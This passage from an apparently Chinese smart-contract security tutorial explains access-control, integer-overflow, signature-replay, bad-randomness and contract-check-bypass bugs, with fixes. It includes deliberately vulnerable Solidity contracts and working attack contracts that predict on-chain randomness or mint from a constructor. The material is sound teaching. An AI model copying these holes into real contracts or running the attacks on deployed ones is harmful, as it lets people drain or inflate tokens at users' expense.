PEPE，这也是伪去中心化的体现。</p><p><code>Harmony</code>公链的跨链桥在 2022 年 6 月被盗 1 亿美元。<code>Harmony</code>桥由 5 个多签人控制，很离谱的是只需其中 2 个人签名就可以批准一笔交易。在黑客设法盗取两个多签人的私钥后，将用户质押的资产盗空</p><h2 id="漏洞合约例子-2"><a href="#漏洞合约例子-2" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>有中心化风险的合约多种多样，这里只举一个最常见的例子：<code>owner</code>地址可以任意铸造代币的<code>ERC20</code>合约。当项目内鬼或黑客取得<code>owner</code>的私钥后，可以无限铸币，造成投资人大量损失。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br><br>contract Centralization is ERC20, Ownable &#123;<br>    constructor() ERC20(&quot;Centralization&quot;, &quot;Cent&quot;) &#123;<br>        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;<br>        transferOwnership(exposedAccount);<br>    &#125;<br><br>    function mint(address to, uint256 amount) external onlyOwner&#123;<br>        _mint(to, amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="如何减少中心化-伪去中心化风险？"><a href="#如何减少中心化-伪去中心化风险？" class="headerlink" title="如何减少中心化&#x2F;伪去中心化风险？"></a>如何减少中心化&#x2F;伪去中心化风险？</h2><ol><li>使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4&#x2F;7 或 6&#x2F;9 多签。如果你不了解多签钱包，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/readme.md">WTF Solidity 第 50 讲：多签钱包</a>。</li><li>多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。</li><li>使用时间锁控制合约，在黑客或项目内鬼修改合约参数&#x2F;盗取资产时，项目方和社区有一些时间来应对，将损失最小化。如果你不了解时间锁合约，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/45_Timelock/readme.md">WTF Solidity 第 45 讲：时间锁</a>。</li></ol><h1 id="S04-权限管理漏洞"><a href="#S04-权限管理漏洞" class="headerlink" title="S04. 权限管理漏洞"></a>S04. 权限管理漏洞</h1><p>智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。下面我们介绍两种常见的权限管理漏洞。</p><p>在下面的代码中，<code>mint()</code>函数没有进行权限管理，那么任何人都可以调用它铸造代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的mint函数，没有限制权限<br>function badMint(address to, uint amount) public &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-授权检查错误"><a href="#2-授权检查错误" class="headerlink" title="2. 授权检查错误"></a>2. 授权检查错误</h3><p>另一类常见的权限管理漏洞是没有在函数中检查调用者是否拥有足够的授权。BSC上DeFi项目 ShadowFi 的代币合约忘了在 <code>burn()</code> 销毁函数中检查调用者的授权额度，导致攻击者可以任意的销毁其他地址的代币。在黑客将流动性池子中的代币销毁之后，仅需卖出一点代币就可以将池子里的所有 <code>BNB</code> 提走，获利 $300,000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 错误的burn函数，没有限制权限<br>function badBurn(address account, uint amount) public &#123;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="预防办法"><a href="#预防办法" class="headerlink" title="预防办法"></a>预防办法</h2><p>权限管理漏洞主要有两种预防办法：</p><ol><li>使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限，比如使用<code>OnlyOwner</code>修饰器，只有合约所有者才能调用。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的mint函数，使用 onlyOwner 修饰器限制权限<br>function goodMint(address to, uint amount) public onlyOwner &#123;<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>在函数的逻辑中确保合约调用者拥有足够的授权。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 正确的burn函数，如果销毁的不是自己的代币，则会检查授权<br>function goodBurn(address account, uint amount) public &#123;<br>    if(msg.sender != account)&#123;<br>        _spendAllowance(account, msg.sender, amount);<br>    &#125;<br>    _burn(account, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="S05-整型溢出"><a href="#S05-整型溢出" class="headerlink" title="S05. 整型溢出"></a>S05. 整型溢出</h1><p>整型溢出漏洞（Arithmetic Over&#x2F;Under Flows）。这是一个比较经典的漏洞，Solidity 0.8版本后内置了Safemath库，因此很少发生</p><p>以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 <code>uint8</code>，只能表示 [0,255] 范围内的数字。如果给 <code>uint8</code> 类型变量的赋值 <code>257</code>，则会上溢（overflow）变为 <code>1</code>；如果给它赋值<code>-1</code>，则会下溢（underflow）变为<code>255</code>。</p><p>攻击者可以利用这个漏洞进行攻击：想象一下，黑客余额为<code>0</code>，他凭空花 <code>$1</code> 之后，余额突然变成了 <code>$2^256-1</code>。2018年的土狗项目 <code>PoWHC</code> 因为这个漏洞被盗了 <code>866 ETH</code>。</p><p><img src="/img/web3/S05-1.png" alt="S05-1"></p><h2 id="漏洞合约例子-3"><a href="#漏洞合约例子-3" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面这个例子是一个简单的代币合约，参考了 <code>Ethernaut</code> 中的合约。它有 <code>2</code> 个状态变量：<code>balances</code> 记录了每个地址的余额，<code>totalSupply</code> 记录了代币总供给。</p><p>它有 <code>3</code> 个函数：</p><ul><li>构造函数：初始化代币总供给。</li><li><code>transfer()</code>：转账函数。</li><li><code>balanceOf()</code>：查询余额函数。</li></ul><p>由于solidity <code>0.8.0</code> 版本之后会自动检查整型溢出错误，溢出时会报错。如果我们要重现这种漏洞，需要使用 <code>unchecked</code> 关键字，在代码块中临时关掉溢出检查，就像我们在 <code>transfer()</code> 函数中做的那样。</p><p>这个例子中的漏洞就出现在<code>transfer()</code> 函数中，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 这个检查由于整型溢出，永远都会通过。因此用户可以无限转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>contract Token &#123;<br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br>  <br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    unchecked&#123;<br>        require(balances[msg.sender] - _value &gt;= 0);<br>        balances[msg.sender] -= _value;<br>        balances[_to] += _value;<br>    &#125;<br>    return true;<br>  &#125;<br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TokenTest is Test &#123;<br>    Token private token;<br>    function setUp() public &#123;<br>        uint initialSupply = 100;<br>        token = new Token(initialSupply);<br>    &#125;<br><br>    function test_transfer() public &#123;<br>        uint Before = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf Before is  &quot;, Before);<br>        bool success = token.transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000);<br>        uint After = token.balanceOf(address(this));<br>        console.log(&quot;token.balanceOf After is  &quot;, After);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试结果：变成了一个很大的数字"><a href="#测试结果：变成了一个很大的数字" class="headerlink" title="测试结果：变成了一个很大的数字"></a>测试结果：变成了一个很大的数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  token.balanceOf Before is   100<br>  token.balanceOf After is   115792089237316195423570985008687907853269984665640564039457584007913129639036<br><br>Traces:<br>  [42015] TokenTest::test_transfer()<br>    ├─ [2828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 100<br>    ├─ [0] console::log(&quot;token.balanceOf Before is  &quot;, 100) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26393] Token::transfer(0xe8D90137C2fb64d2e64E8BC65a171be53C952A9e, 1000)<br>    │   └─ ← [Return] true<br>    ├─ [828] Token::balanceOf(TokenTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]<br>    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]<br>    ├─ [0] console::log(&quot;token.balanceOf After is  &quot;, 115792089237316195423570985008687907853269984665640564039457584007913129639036 [1.157e77]) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure><h2 id="预防办法-1"><a href="#预防办法-1" class="headerlink" title="预防办法"></a>预防办法</h2><ol><li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li><li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li></ol><h1 id="S06-签名重放"><a href="#S06-签名重放" class="headerlink" title="S06. 签名重放"></a>S06. 签名重放</h1><p>上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。</p><p>数字签名一般有两种常见的重放攻击：</p><ol><li>普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。</li><li>跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。</li></ol><p><img src="/img/web3/S06-1.png" alt="S06-1"></p><h2 id="漏洞合约例子-4"><a href="#漏洞合约例子-4" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面的<code>SigReplay</code>合约是一个<code>ERC20</code>代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 <code>to</code> 铸造相应数量 <code>amount</code> 的代币。合约中保存了 <code>signer</code> 地址，来验证签名是否有效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;<br><br>// 权限管理错误例子<br>contract SigReplay is ERC20 &#123;<br><br>    address public signer;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;<br>        signer = msg.sender;<br>    &#125;<br>    <br>    /**<br>     * 有签名重放漏洞的铸造函数<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b<br>     */<br>    function badMint(address to, uint amount, bytes memory signature) public &#123;<br>        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be<br>     */<br>    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;<br>        return keccak256(abi.encodePacked(to, amount));<br>    &#125;<br><br>    /**<br>     * @dev 获得以太坊签名消息<br>     * `hash`：消息哈希 <br>     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]<br>     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`<br>     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。<br>     */<br>    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;<br>        // 32 is the length in bytes of hash,<br>        // enforced by the type signature above<br>        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));<br>    &#125;<br><br>    // ECDSA验证<br>    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;<br>        return ECDSA.recover(_msgHash, _signature) == signer;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>注意</strong> 铸造函数 <code>badMint()</code> 没有对 <code>signature</code> 查重，导致同样的签名可以多次使用，无限铸造代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function badMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="预防办法-2"><a href="#预防办法-2" class="headerlink" title="预防办法"></a>预防办法</h2><p>签名重放攻击主要有两种预防办法：</p><ol><li><p>将使用过的签名记录下来，比如记录下已经铸造代币的地址 <code>mintedAddress</code>，防止签名反复使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址<br><br>function goodMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    // 检查该地址是否mint过<br>    require(!mintedAddress[to], &quot;Already minted&quot;);<br>    // 记录mint过的地址<br>    mintedAddress[to] = true;<br>    _mint(to, amount);<br>&#125;<br>```solidity<br></code></pre></td></tr></table></figure></li><li><p>将 <code>nonce</code> （数值随每次交易递增）和 <code>chainid</code> （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint nonce;<br><br>function nonceMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>    nonce++;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>对于由用户输入<code>signature</code>的场景，需要检验<code>signature</code>的长度，确保其长度为<code>65bytes</code>，否则也会产生签名重放问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address to, uint amount, bytes memory signature) public &#123;<br>    require(signature.length == 65, &quot;Invalid signature length&quot;);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>一、签名重放攻击概念</p><p>1.定义</p><ul><li>攻击者截获有效签名</li><li>多次重复使用同一签名</li><li>非法执行授权操作</li></ul><p>2.典型攻击场景</p><ul><li>转账授权</li><li>特权操作</li><li>资产交易</li><li>权限验证</li></ul><p>四、最佳实践</p><p>1.始终使用Nonce<br>2.添加过期时间<br>3.使用域分隔符<br>4.限制签名使用次数<br>5.严格验证签名参数</p><p>五、常见错误</p><p>1.重用Nonce<br>2.没有过期机制<br>3.签名验证不严格<br>4.未限制签名范围</p><p>六、推荐库</p><p>1.OpenZeppelin</p><ul><li>提供安全签名工具</li><li>标准化实现</li></ul><p>2.EIP-712实现</p><ul><li>安全的签名标准</li><li>跨链兼容</li></ul><h1 id="S07-坏随机数"><a href="#S07-坏随机数" class="headerlink" title="S07. 坏随机数"></a>S07. 坏随机数</h1><p>智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。</p><h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如<code>random()</code>。很多项目方不得不使用链上的伪随机数生成方法，例如 <code>blockhash()</code> 和 <code>keccak256()</code> 方法。</p><p>坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有<code>NFT</code>而非随机抽取。更多的内容可以阅读 <a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p><h2 id="坏随机数案例"><a href="#坏随机数案例" class="headerlink" title="坏随机数案例"></a>坏随机数案例</h2><p>下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BadRandomness is ERC721 &#123;<br>    uint256 totalSupply;<br><br>    // 构造函数，初始化NFT合集的名称、代号<br>    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;<br><br>    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint<br>    function luckyMint(uint256 luckyNumber) external &#123;<br>        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number<br>        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);<br><br>        _mint(msg.sender, totalSupply); // mint<br>        totalSupply++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它有一个主要的铸造函数 <code>luckyMint()</code>，用户调用时输入一个 <code>0-99</code> 的数字，如果和链上生成的伪随机数 <code>randomNumber</code> 相等，即可铸造幸运 NFT。伪随机数使用 <code>blockhash</code> 和 <code>block.timestamp</code> 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。</p><p>下面我们写个攻击合约 <code>Attack.sol</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    function attackMint(BadRandomness nftAddr) external &#123;<br>        // 提前计算随机数<br>        uint256 luckyNumber = uint256(<br>            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))<br>        ) % 100;<br>        // 利用 luckyNumber 攻击<br>        nftAddr.luckyMint(luckyNumber);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击函数 <code>attackMint()</code>中的参数为 <code>BadRandomness</code>合约地址。在其中，我们计算了随机数 <code>luckyNumber</code>，然后将它作为参数输入到 <code>luckyMint()</code> 函数完成攻击。由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。</p><h1 id="S08-绕过合约长度检查"><a href="#S08-绕过合约长度检查" class="headerlink" title="S08. 绕过合约长度检查"></a>S08. 绕过合约长度检查</h1><p>有一些项目为了限制程序员，会用到isContract()方法来校验msg.sender限制为外部账户(EOA)，而非合约地址</p><p>这个函数利用的是<code>extcodesize</code>获取改地址所存储的bytecode长度(runtime)，如果大于0，这判断为合约，否则就是EOA（用户）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用 extcodesize 检查是否为合约<br>function isContract(address account) public view returns (bool) &#123;<br>    // extcodesize &gt; 0 的地址一定是合约地址<br>    // 但是合约在构造函数时候 extcodesize 为0<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(account)<br>    &#125;<br>    return size &gt; 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个漏洞，就是在合约在被创建的时候，<code>runtime bytecode</code> 还没有被存储到地址上，因此 <code>bytecode</code> 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 <code>constructor</code> 中的话，就可以绕过 <code>isContract()</code> 检查。</p><p><img src="/img/web3/S08-1.png" alt="S08-1"></p><h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们来看一个例子：<code>ContractCheck</code>合约是一个 freemint ERC20 合约，铸造函数 <code>mint()</code> 中使用了 <code>isContract()</code> 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 <code>mint()</code> 可以铸造 100 枚代币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用extcodesize检查是否为合约地址<br>contract ContractCheck is ERC20 &#123;<br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125;<br>    <br>    // 利用 extcodesize 检查是否为合约<br>    function isContract(address account) public view returns (bool) &#123;<br>        // extcodesize &gt; 0 的地址一定是合约地址<br>        // 但是合约在构造函数时候 extcodesize 为0<br>        uint size;<br>        assembly &#123;<br>            size := extcodesize(account)<br>        &#125;<br>        return size &gt; 0;<br>    &#125;<br><br>    // mint函数，只有非合约地址能调用（有漏洞）<br>    function mint() public &#123;<br>        require(!isContract(msg.sender), &quot;Contract not allowed!&quot;);<br>        _mint(msg.sender, 100);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们写一个攻击合约，在 <code>constructor</code> 中多次调用 <code>ContractCheck</code> 合约中的 <code>mint()</code> 函数，批量铸造 <code>1000</code> 枚代币：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用构造函数的特点攻击<br>contract NotContract &#123;<br>    bool public isContract;<br>    address public contractCheck;<br><br>    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。<br>    constructor(address addr) &#123;<br>        contractCheck = addr;<br>        isContract = ContractCheck(addr).isContract(address(this));<br>        // This will work<br>        for(uint i; i &lt; 10; i++)&#123;<br>            ContractCheck(addr).mint();<br>        &#125;<br>    &#125;<br><br>    // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测<br>    function mint() external &#123;<br>        ContractCheck(contractCheck).mint();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们之前讲的是正确的话，在构造函数调用 <code>mint()</code> 可以绕过 <code>isContract()</code> 的检查成功铸造代币，那么函数将成功部署，并且状态变量 <code>isContract</code> 会在构造函数赋值 <code>false</code>。而在合约部署之后，<code>runtime bytecode</code> 已经被存储在合约地址上了，<code>extcodesize &gt; 0</code>， <code>isContract()</code> 能够成功阻止铸造，调用 <code>mint()</code> 函数将失败。</p><h2 id="预防办法-3"><a href="#预防办法-3" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用 <code>(tx.origin == msg.sender)</code> 来检测调用者是否为合约。如果调用者为 EOA，那么<code>tx.origin</code>和<code>msg.sender</code>相等；如果它们俩不相等，调用者为合约。在<a 